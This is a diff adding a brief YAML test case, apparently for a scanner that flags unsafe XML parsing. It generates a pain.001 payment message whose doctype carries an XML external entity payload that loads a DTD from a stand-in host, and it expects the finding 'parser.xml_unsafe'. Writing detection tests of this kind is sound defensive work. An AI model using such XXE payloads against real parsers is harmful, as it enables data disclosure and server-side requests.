@@ -1,0 +1,8 @@
+generator: camt053
+args:
+  name: pain001.xml
+  message: pain.001.001.09
+  doctype: <!DOCTYPE Document [<!ENTITY % p SYSTEM "https://example.invalid/x.dtd">
+    %p;]>
+must_find:
+- parser.xml_unsafe
